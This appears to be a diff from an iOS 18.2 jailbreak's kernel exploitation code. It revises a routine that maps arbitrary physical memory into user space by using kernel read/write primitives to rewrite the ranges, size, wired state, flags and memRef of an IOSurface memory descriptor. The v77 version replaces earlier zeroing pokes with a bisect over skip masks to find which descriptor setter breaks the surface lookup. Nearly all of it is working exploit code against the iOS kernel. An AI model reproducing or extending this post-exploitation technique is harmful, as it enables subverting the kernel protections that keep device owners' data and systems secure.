@@ -158,13 +158,22 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// that only matters in the already-failing case).
 	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
 	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
-	// v76: A/B the Fugu15-era zeroing pokes — v75 proved every setter lands
-	// yet step2 lookup=0; d70/d18/d90 were REAL kernel pointers on 18.2, so
-	// zeroing them may be what breaks the surface. Even windows skip, odd
-	// windows apply. Data decides.
+	// v77: per-window setter bisect. v76's A/B exonerated the zeroing pokes
+	// (skip == apply == lookup=0 across all 16 windows) and the 32-bit flags
+	// write landed. ONE unknown remains: does IOSurfaceLookupFromMachPort
+	// work on an UNTOUCHED 18.2 surface, or does one specific setter break
+	// it? Each window skips a different subset (bit set = skip):
+	//   bit0 ranges  bit1 size  bit2 wired  bit3 memRef  bit4 flags
+	// Window 0 = pure control (vendor path, straight to lookup). Pokes are
+	// retired everywhere (their real values live in KMAP pre,desc).
 	static unsigned g_kmap_seq = 0;
 	unsigned seq = g_kmap_seq++;
-	jb_tr_beacon("KMAP seq=%u,pokes=%s", seq, (seq & 1) ? "apply" : "skip");
+	static const unsigned kSkipMasks[16] = {
+		0x3F, 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x30,
+		0x38, 0x3E, 0x3D, 0x3B, 0x37, 0x2F, 0x3F, 0x3F,
+	};
+	unsigned skip = kSkipMasks[seq & 15];
+	jb_tr_beacon("KMAP win=%u,skip=%02x", seq, skip);
 	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
@@ -195,7 +204,10 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	if (gPrimitives.krwMinSafeReadSize > 0x10) {
+	if (skip & 0x01) {
+		jb_tr_beacon("KMAP ranges,skipped,orig=%llx", (unsigned long long)ranges);
+	}
+	else if (gPrimitives.krwMinSafeReadSize > 0x10) {
 		jb_tr_beacon("KMAP path,fakeranges,minsafe=%x", gPrimitives.krwMinSafeReadSize);
 		// If the primitive we have cannot read <=0x10 bytes at a time, we need to create our own struct
 		// And later clean it up when we have a better primitive in IOSurface_map_cleanup
@@ -225,39 +237,33 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		kwrite64(ranges+8, size);
 	}
 
-	IOMemoryDescriptor_set_size(desc, size);
-
-	if (seq & 1) {
-		kwrite64(desc + 0x70, 0);
-		kwrite64(desc + 0x18, 0);
-		kwrite64(desc + 0x90, 0);
-		// v74: readback of the Fugu15-era descriptor pokes — if these land and
-		// step2 still returns base=0, the offsets are right and the base path
-		// (IOSurfaceClient walk) is what's wrong for 18.2.
-		jb_tr_beacon("KMAP rb,pokes,%llx,%llx,%llx",
-		             (unsigned long long)kread64(desc + 0x70),
-		             (unsigned long long)kread64(desc + 0x18),
-		             (unsigned long long)kread64(desc + 0x90));
-	}
-	else {
-		jb_tr_beacon("KMAP pokes,skipped,d70=%llx,d18=%llx,d90=%llx",
-		             (unsigned long long)kread64(desc + 0x70),
-		             (unsigned long long)kread64(desc + 0x18),
-		             (unsigned long long)kread64(desc + 0x90));
+	if (!(skip & 0x02)) {
+		IOMemoryDescriptor_set_size(desc, size);
 	}
 
-	IOMemoryDescriptor_set_wired(desc, true);
+	// v77: the 0x70/0x18/0x90 zeroing pokes are RETIRED — v76's A/B proved
+	// skip == apply (identical lookup=0 everywhere), and on 18.2 these fields
+	// held real kernel pointers. Pre-rewrite values are in KMAP pre,desc.
+
+	if (!(skip & 0x04)) {
+		IOMemoryDescriptor_set_wired(desc, true);
+	}
 
 	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
-	// v76: set_flags uses an 8-BIT write — v75 showed it can never clear the
-	// 0x400 bit (byte 1) of the 0x410 mask on 18.2 (f20 went 0x510513→
-	// 0x510523 with 0x400 still set). Write the full 32 bits here (desc is a
-	// large object — the sub-32B-object law does not apply to this target).
-	uint32_t newflags = (flags & ~0x410) | 0x20;
-	kwrite32(desc + 0x20, newflags);
-	jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
+	if (!(skip & 0x10)) {
+		// v76: 32-bit flags write — the 8-bit setter can never clear the
+		// 0x400 bit (byte 1) of the 0x410 mask on 18.2.
+		uint32_t newflags = (flags & ~0x410) | 0x20;
+		kwrite32(desc + 0x20, newflags);
+		jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
+	}
+	else {
+		jb_tr_beacon("KMAP flags,kept=%x", flags);
+	}
 
-	IOMemoryDescriptor_set_memRef(desc, 0);
+	if (!(skip & 0x08)) {
+		IOMemoryDescriptor_set_memRef(desc, 0);
+	}
 
 	// v75: full post-rewrite desc readback — diff against `pre,desc` names
 	// the exact setter that mangled (or failed to mangle) the descriptor.
